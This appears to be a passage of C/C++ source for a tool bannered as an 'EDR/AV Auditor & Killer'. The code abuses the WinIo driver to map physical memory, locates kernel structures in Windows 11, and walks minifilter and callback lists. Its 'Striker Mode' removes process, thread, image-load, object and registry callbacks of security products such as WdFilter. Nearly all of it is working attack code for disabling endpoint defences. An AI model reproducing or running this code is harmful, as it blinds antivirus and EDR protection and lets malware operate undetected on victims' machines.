        while (currentInstLinkVA != instListHeadVA && currentInstLinkVA != 0 && instIdx < 15) {
            UINT64 instStructVA = currentInstLinkVA; // The instance often starts at the list link.
            UINT64 paInst = VirtualToPhysical(cr3, instStructVA, phys, physSize);

            // In FLT_INSTANCE, the parent filter pointer is expected at +0x18.
            UINT64 parentFilterVA = ReadMemoryU64(phys, paInst + 0x18, physSize);
            CHAR* fName = GetMinifilterName(parentFilterVA, cr3, phys, physSize);

            printf("   |-- Instance [%d]: %s (VA: 0x%llx)\n", instIdx, fName ? fName : "Unknown", instStructVA);
            if (fName) free(fName);

            currentInstLinkVA = ReadMemoryU64(phys, paInst, physSize);
            instIdx++;
        }

        currentVolLinkVA = ReadMemoryU64(phys, VirtualToPhysical(cr3, currentVolLinkVA, phys, physSize), physSize);
        volIdx++;
    }
}

void RegisterFoundCallback(UINT64 nodeVA, const char* driverName, UINT64 cr3, BYTE* phys, UINT64 physSize) {
    // Avoid duplicate entries for the same callback node.
    for (int i = 0; i < NodeCount; i++) {
        if (FoundNodes[i].NodeAddress == nodeVA) return;
    }

    // Enforce the fixed-size tracking table limit.
    if (NodeCount >= 256) return;

    // Save the original Flink/Blink pointers for later integrity validation.
    UINT64 paNode = VirtualToPhysical(cr3, nodeVA, phys, physSize);
    if (!paNode) return;

    UINT64 flink = *(UINT64*)(&phys[paNode]);
    UINT64 blink = *(UINT64*)(&phys[paNode + 8]);

    // Persist the node metadata in the local tracking table.
    FoundNodes[NodeCount].NodeAddress = nodeVA;
    FoundNodes[NodeCount].OriginalFlink = flink;
    FoundNodes[NodeCount].OriginalBlink = blink;
    strncpy(FoundNodes[NodeCount].DriverName, driverName, 31);
    FoundNodes[NodeCount].IsRemoved = FALSE;

    printf("[+] Callback Registered: %s | Node: 0x%llx | Flink: 0x%llx\n",
        driverName, nodeVA, flink);

    NodeCount++;
}

UINT64 FindFltFrame(UINT64 fltMgrBase, UINT64 cr3, BYTE* phys, UINT64 physSize) {
    // Resolve the FltEnumerateFilters export from fltmgr.sys.
    UINT64 funcVA = GetMinifilterFuncAddress((CHAR*)"FLTMGR.sys", (CHAR*)"FltEnumerateFilters");
    if (!funcVA) {
        printf("[-] Could not find FltEnumerateFilters address.\n");
        return 0;
    }

    printf("[*] Scanning FltEnumerateFilters for FltGlobals pattern...\n");

    UINT64 targetInstrVA = 0;
    // Scan the first 400 bytes of the function body.
    for (int i = 0; i < 400; i++) {
        UINT64 currentVA = funcVA + i;
        UINT64 pa = VirtualToPhysical(cr3, currentVA, phys, physSize);
        if (!pa || pa + 3 >= physSize) continue;

        // Pattern: 48 8D 05 (LEA RAX, [RIP + displacement]).
        if (phys[pa] == 0x48 && phys[pa + 1] == 0x8D && phys[pa + 2] == 0x05) {
            targetInstrVA = currentVA;
            break;
        }
    }

    if (!targetInstrVA) {
        printf("[-] Pattern 48 8D 05 not found in FltEnumerateFilters.\n");
        return 0;
    }

    // Compute the address referenced by the RIP-relative instruction.
    UINT64 paOffset = VirtualToPhysical(cr3, targetInstrVA + 3, phys, physSize);
    INT32 displacement = *(INT32*)(&phys[paOffset]);

    // This LEA instruction is 7 bytes long.
    UINT64 framePtrVA = targetInstrVA + 7 + displacement;

    // Read the pointer to recover the real structure address.
    UINT64 fltFrameVA = ReadMemoryU64(phys, VirtualToPhysical(cr3, framePtrVA, phys, physSize), physSize);

    // Depending on the matched instruction, the pointer can reference FltGlobals+8.
    fltFrameVA -= 0x8;

    printf("[+] Successfully located FLT_FRAME at: 0x%llx\n", fltFrameVA);
    return fltFrameVA;
}
VOID AuditEDRCallbacks(UINT64 fltFrameVA, UINT64 cr3, BYTE* phys, UINT64 physSize) {
    // Dynamic offsets observed on the target Windows 11 build.
    UINT64 offFilterList = 0x50;     // RegisteredFilters.rList
    UINT64 offInstanceList = 0x70;   // _FLT_FILTER.InstanceList
    UINT64 offCallbackNodes = 0x180; // _FLT_INSTANCE.CallbackNodes, validate with dt.

    UINT64 filterListHead = fltFrameVA + offFilterList;
    UINT64 currFilterLink = ReadMemoryU64(phys, VirtualToPhysical(cr3, filterListHead, phys, physSize), physSize);

    while (currFilterLink != filterListHead && currFilterLink != 0) {
        UINT64 filterStructVA = currFilterLink - 0x10;
        CHAR* name = GetMinifilterName(filterStructVA, cr3, phys, physSize);

        // Process only selected target filters in this experimental path.
        if (name && (strstr(name, "UCPD") || strstr(name, "WdFilter"))) {
            printf("[!] Target Filter Found: %s at 0x%llx\n", name, filterStructVA);

            // Walk into the filter instance list.
            UINT64 instListHead = filterStructVA + offInstanceList + 8;
            UINT64 currInstLink = ReadMemoryU64(phys, VirtualToPhysical(cr3, instListHead, phys, physSize), physSize);

            while (currInstLink != instListHead && currInstLink != 0) {
                UINT64 instStructVA = currInstLink - 0x10; // Common _FLT_INSTANCE link offset.

                // Scan CallbackNodes for IRP_MJ_CREATE, READ, and related operations.
                for (int j = 0; j < 50; j++) {
                    UINT64 callbackNodePtrVA = instStructVA + offCallbackNodes + (j * 8);
                    UINT64 callbackNodeAddr = ReadMemoryU64(phys, VirtualToPhysical(cr3, callbackNodePtrVA, phys, physSize), physSize);

                    if (callbackNodeAddr != 0) {
                        // A callback hook point was found.
                        RegisterFoundCallback(callbackNodeAddr, name, cr3, phys, physSize);
                    }
                }
                currInstLink = ReadMemoryU64(phys, VirtualToPhysical(cr3, currInstLink, phys, physSize), physSize);
            }
        }
        if (name) free(name);
        currFilterLink = ReadMemoryU64(phys, VirtualToPhysical(cr3, currFilterLink, phys, physSize), physSize);
    }
}
UINT64 FindFltGlobals(UINT64 fltMgrBase, UINT64 cr3, BYTE* phys, UINT64 physSize) {
    UINT64 funcVA = GetMinifilterFuncAddress("FLTMGR.sys", (CHAR*)"FltEnumerateFilters");
    if (!funcVA) return 0;

    printf("[*] Scanning FltEnumerateFilters @ 0x%llx\n", funcVA);

    // --- READ DIAGNOSTIC ---
    printf("[DBG] Dumping the first 16 bytes of the function:\n");
    for (int j = 0; j < 16; j++) {
        UINT64 pa = VirtualToPhysical(cr3, funcVA + j, phys, physSize);
        if (pa && pa < physSize)
            printf("%02X ", phys[pa]);
        else
            printf("?? ");
    }
    printf("\n");

    for (int i = 0; i < 1000; i++) {
        UINT64 va = funcVA + i;
        UINT64 pa = VirtualToPhysical(cr3, va, phys, physSize);
        if (!pa || pa + 7 >= physSize) continue;

        // LEA pattern: 48 8D 05 or 48 8D 0D.
        if (phys[pa] == 0x48 && phys[pa + 1] == 0x8D && (phys[pa + 2] == 0x05 || phys[pa + 2] == 0x0D)) {
            INT32 displacement = *(INT32*)(&phys[pa + 3]);
            UINT64 targetVA = va + 7 + (INT64)displacement;

            // Mask with 0xFFF to ignore ASLR and compare only the page offset.
            // Observed dump values: 0x880 (+0xC0) or 0x818 (+0x58).
            if ((targetVA & 0xFFF) == 0x880) {
                printf("[+] Found FltGlobals via FrameList Offset (0xC0) @ 0x%llx\n", targetVA - 0xC0);
                return targetVA - 0xC0;
            }
            if ((targetVA & 0xFFF) == 0x818) {
                printf("[+] Found FltGlobals via Resource Offset (0x58) @ 0x%llx\n", targetVA - 0x58);
                return targetVA - 0x58;
            }
        }
    }

    printf("[-] No LEA pattern matched the known offsets.\n");
    return 0;
}

// Reads a UTF-16 string from mapped physical memory and prints an ASCII approximation.
void PrintUnicodeString(UINT64 va, USHORT len, UINT64 cr3, BYTE* phys, UINT64 physSize) {
    if (len == 0 || len > 512) return;

    for (int i = 0; i < len; i += 2) {
        UINT64 pa = VirtualToPhysical(cr3, va + i, phys, physSize);
        if (pa && pa < physSize) {
            char c = (char)phys[pa]; // Simplify display by keeping only the low ASCII byte.
            if (c >= 32 && c <= 126) printf("%c", c);
            else printf(".");
        }
    }
}

void DisplayMinifilters(UINT64 fltGlobalsBase, UINT64 cr3, BYTE* phys, UINT64 physSize) {
    if (!fltGlobalsBase) return;

    printf("\n----------------------------------------------------\n");
    printf(" Registered MiniFilter Drivers :\n");
    printf("----------------------------------------------------\n");

    // Access the frame list at FltGlobals + 0xC0.
    UINT64 frameListHead = fltGlobalsBase + 0xC0;
    UINT64 paFrameHead = VirtualToPhysical(cr3, frameListHead, phys, physSize);
    if (!paFrameHead) return;

    // Read the first frame through Flink.
    UINT64 currentFrameLink = *(UINT64*)(&phys[paFrameHead]);

    // Walk frames. Most systems expose one frame, but keep the logic generic.
    while (currentFrameLink != 0 && currentFrameLink != frameListHead) {
        // In FLTP_FRAME, Links is expected at offset 0x08.
        UINT64 frameAddr = currentFrameLink - 0x08;

        // Access this frame's filter list. Offset 0xA8 is based on the target dump.
        UINT64 filterListHead = frameAddr + 0xA8;
        UINT64 paFilterHead = VirtualToPhysical(cr3, filterListHead, phys, physSize);
        if (!paFilterHead) break;

        UINT64 currentFilterLink = *(UINT64*)(&phys[paFilterHead]);

        //  Walk filters.
        int filterCount = 0;
        while (currentFilterLink != 0 && currentFilterLink != filterListHead) {
            // In FLT_FILTER, PrimaryLink is expected at offset 0x10.
            UINT64 filterAddr = currentFilterLink - 0x10;

            // Read the filter name. It is represented as a UNICODE_STRING at offset 0x18.
            // Offset 0x18: Length (2 bytes)
            // Offset 0x1A: MaximumLength (2 bytes)
            // Offset 0x20: Buffer (Pointer 8 bytes)

            UINT64 paFilterObj = VirtualToPhysical(cr3, filterAddr + 0x18, phys, physSize);
            if (paFilterObj) {
                USHORT nameLen = *(USHORT*)(&phys[paFilterObj]);
                UINT64 nameBufferVA = *(UINT64*)(&phys[paFilterObj + 8]);

                printf(" [%d] Filter: 0x%llx | Name: ", filterCount++, filterAddr);
                PrintUnicodeString(nameBufferVA, nameLen, cr3, phys, physSize);
                printf("\n");
            }

            // Move to the next filter. Flink is at offset 0x00 of the current link.
            UINT64 paNextLink = VirtualToPhysical(cr3, currentFilterLink, phys, physSize);
            if (!paNextLink) break;
            currentFilterLink = *(UINT64*)(&phys[paNextLink]);

            if (filterCount > 100) break; // Safety bound for corrupted or unexpected lists.
        }

        // Move to the next frame.
        UINT64 paNextFrame = VirtualToPhysical(cr3, currentFrameLink, phys, physSize);
        if (!paNextFrame) break;
        currentFrameLink = *(UINT64*)(&phys[paNextFrame]);
    }
    printf("----------------------------------------------------\n");
}

void ShowCleanBanner() {
    printf("##############################################################################\n");
    printf("#                                                                            #\n");
    printf("#   V I R U N G A   |  EDR/AV Auditor & Killer                               #\n");
    printf("#   Version 2.0     |  By Simon Ngoy Mukendi                                 #\n");
    printf("#                                                                            #\n");
    printf("##############################################################################\n");
    printf("[*] Targeted Architecture: Windows 11 x64\n");
}
int main()
{
    ShowCleanBanner();

    HMODULE hNtos = LoadLibraryW(L"ntoskrnl.exe");

    if (!hNtos)
    {
        printf("[!] Failed to load ntoskrnl.exe\n");
        return 1;
    }

    UINT64 PsInitialSystemProcess_offset =
        (UINT64)GetProcAddress(hNtos, "PsInitialSystemProcess")
        - (UINT64)hNtos;

    //printf("[+] PsInitialSystemProcess offset = 0x%llx\n",
        //PsInitialSystemProcess_offset);



    MEMORYSTATUSEX ms{};
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);

    HANDLE hDev = CreateFileA("\\\\.\\WinIo",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDev == INVALID_HANDLE_VALUE)
        printf("[!] Loading driver failed with error : %d\n", GetLastError());


    auto req = (PHYSICAL_MEMORY_READ*)malloc(sizeof(PHYSICAL_MEMORY_READ));
    req->addr = 0;
    req->size = ms.ullTotalPhys;
    req->outPtr = 0;


    DWORD ret = 0;
    if (!DeviceIoControl(hDev, IOCTL_MAP_PHYSICAL_ADDR,
        req, sizeof(*req),
        req, sizeof(*req),
        &ret, NULL))
    {
        printf("[!] Failed to map physical memory\n");
        return 1;
    }
    BYTE* phys = (BYTE*)req->outPtr;
    UINT64 physSize = req->size;

    printf("[+] Physical Memory Mapped  0x%llx (size = 0x%llx)\n", (UINT64)phys, physSize);

    UINT64 halpAddr = 0;
    UINT64 halOffset = 0;

    unsigned char bytes[8] = { 0x0f,0x22,0xd8,0xeb,0x00,0xf7,0x47,0x08 };
    uint64_t motif = *(uint64_t*)bytes;

    for (UINT64 i = 0; i < 0x1000000; i++)
    {


        UINT64 q = (DWORD_PTR)hNtos + i;
        if ((*((unsigned long long*) q)) == motif)
        {
            halpAddr = q;
            halOffset = i;
            //printf("[+] HalpLMStub Physical  0x%llx\n", i);
            break;
        }
    }

    if (!halpAddr)
    {
        printf("[!] HalpLMStub NOT FOUND\n");
        return 1;
    }

    UINT64 physOffset;

    for (physOffset = 0; physOffset < 100000; physOffset += sizeof(UINT64)) {
        UINT64 q_value = ReadMemoryU64(phys, physOffset, physSize);

        if ((q_value & 0xFFFF) == (halpAddr & 0xFFFF)) {
            printf("[+] HalpLMstub = 0x%llx\n", q_value);
            halpAddr = q_value;
            //printf("[+] Physical offset =  0x%llx\n", physOffset);
            break;
        }
    }


    UINT64 cr3 = 0;
    for (size_t i = 0; i < sizeof(ULONG32); ++i) {
        cr3 |= (ULONG32)(phys[physOffset + 0x30 + i]) << (i * 8);
    }
    //printf("[+] Kernel CR3 = 0x% llx\n", cr3);


    UINT64 kernelBase = halpAddr - halOffset;
    printf("[+] ntoskrnl.exe Base Address 0x%llx\n", kernelBase);

    //HMODULE hFltMgr = LoadLibraryW(L"FLTMGR.sys");
    UINT64 fltMgrBase = GetModuleBase("FLTMGR.sys");

    if (fltMgrBase == NULL)
        printf("[!] Loading Fltmgr failed ! \n");

    printf("[+] FLTMGR Address at : 0x%llx\n", fltMgrBase);

    UINT64 funcVA = GetMinifilterFuncAddress("FLTMGR.sys", (CHAR*)"FltEnumerateFilters");
    if (!funcVA) printf("[!] FltEnumerateFilters failed!\n");

    UINT64 funcVAPhy = VirtualToPhysical(cr3, funcVA, phys, physSize);
    //printf("[+] FltEnumerateFilters Phys Address at : 0x%llx\n", funcVAPhy);
    
    int mode = 0;
    printf("\nVIRUNGA MENU\n");
    printf("1 : Audit Mode (Scan only)\n");
    printf("2 : Striker Mode (Callback Removal)\n");
    printf("Choice : ");
    scanf_s("%d", &mode);

    if (mode == 1) {

        const char* routines[] = {
              "PsSetCreateProcessNotifyRoutine",
              "PsSetCreateThreadNotifyRoutine",
              "PsSetLoadImageNotifyRoutine"
        };

        for (const char* name : routines) {
            printf("--------------------------------------------------------------------\n");
            printf(" Drivers registered to %s :\n", name);
            printf("--------------------------------------------------------------------\n");

            UINT64 arrayVA = FindNotifyRoutineArray(hNtos, kernelBase, name);

            if (arrayVA) {
                printf("[+] Array find (VA): 0x%llx\n", arrayVA);
                DisplayNotifyCallbacksDrivers(arrayVA, cr3, phys, physSize);
            }
            else {
                printf("[!] Unable to find the table for %s\n", name);
            }
        }


        struct { int flag; const char* name; } scanTargets[] = { {1, "PsProcessType"}, {2, "PsThreadType"} };

        printf("--------------------------------------------------------------------\n");
        printf(" Drivers registered ObCallbacks : \n");
        printf("--------------------------------------------------------------------\n");

        for (int i = 0; i < 2; i++) {
            // Use the expected flag values: 1 for process, 2 for thread.
            UINT64 typeStructVA = GetObjectTypeAddrByScan(hNtos, kernelBase, cr3, phys, physSize, scanTargets[i].flag);

            if (typeStructVA) {
                printf("\n[!] Analysis of ObCallbacks for %s\n", scanTargets[i].name);
                printf("[+] Found structure VA: 0x%llx\n", typeStructVA);

                // Display the decoded object callbacks.
                AuditObRegisterCallbacks(typeStructVA, cr3, phys, physSize, 0);
            }
        }

        ClearCmRegisterCallback(hNtos, kernelBase, cr3, phys, physSize, FALSE);
        //AuditMiniFilters(hFltMgr, fltMgrBase, cr3, phys, physSize);
        //AuditEDRCallbacks(fltMgrBase, cr3, phys, physSize);
        
        UINT64 FltEnumerateFileAddr = GetMinifilterFuncAddress((CHAR*)"FLTMGR.sys", (CHAR*)"FltEnumerateFilters");
        if (FltEnumerateFileAddr == 0)
            printf("[!] FltEnumerateFile Address Failed!\n");

        printf("[+] FltEnumerateFile at :0x%llx\n", FltEnumerateFileAddr);

    }

    else if (mode == 2) {
        printf("\nProceed to neutralize all Registry Callbacks? (y/n): ");
        char confirm;
        std::cin >> confirm;
        if (confirm == 'y' || confirm == 'Y') {

            int blacklistCount = sizeof(blacklist) / sizeof(blacklist[0]);

            printf("\n[!] Launch of SELECTIVE STRIKER mode...\n");

            const char* routines[] = {
                "PsSetCreateProcessNotifyRoutine",
                "PsSetCreateThreadNotifyRoutine",
                "PsSetLoadImageNotifyRoutine"
            };

            for (const char* name : routines) {
                UINT64 arrayVA = FindNotifyRoutineArray(hNtos, kernelBase, name);
                if (arrayVA) {
                    printf("\n Cleaning of %s\n", name);
                    StrikerByBlacklist(arrayVA, cr3, phys, physSize, blacklist, blacklistCount);
                }
            }

            UINT64 processTypeStruct = GetObjectTypeAddrByScan(hNtos, kernelBase, cr3, phys, physSize, 1);
            if (processTypeStruct) {
                RemoveObRegisterCallbacks(processTypeStruct, cr3, phys, physSize, 1); // 1 = Process
            }

            UINT64 threadTypeStruct = GetObjectTypeAddrByScan(hNtos, kernelBase, cr3, phys, physSize, 2);
            if (threadTypeStruct) {
                RemoveObRegisterCallbacks(threadTypeStruct, cr3, phys, physSize, 2);  // 2 = Thread
            }
            ClearCmRegisterCallback(hNtos, kernelBase, cr3, phys, physSize, TRUE);
            printf("\n[+] Operation Striker complete.\n");
        }

    }

  
    UnMapViewOfSection(hDev, req);
    free(req);
    FreeLibrary(hNtos);

}

